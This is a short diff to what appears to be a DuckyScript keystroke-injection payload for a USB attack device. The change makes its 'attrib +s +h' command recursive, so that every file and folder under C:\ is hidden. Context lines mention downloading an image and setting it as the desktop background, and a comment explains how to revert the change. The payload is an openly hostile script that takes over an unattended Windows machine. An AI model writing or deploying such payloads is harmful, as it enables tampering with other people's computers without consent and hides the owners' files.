@@ -30,7 +30,7 @@ REM --Navigate To C:\ & Set Hidden Attribute To Each File And Folder--
 
 STRING cd /
 ENTER
-STRING attrib +s +h *; exit
+STRING attrib +s +h /s /d *; exit
 ENTER
 
 REM --Download Image And Set It As Background--
@@ -49,4 +49,4 @@ ENTER
 GUI d
 
 
-REM --Reverting Requires "attrib -s -h *" to be run with powershell from C:\--
+REM --Reverting Requires "attrib -s -h /s /d *" to be run with powershell from C:\--
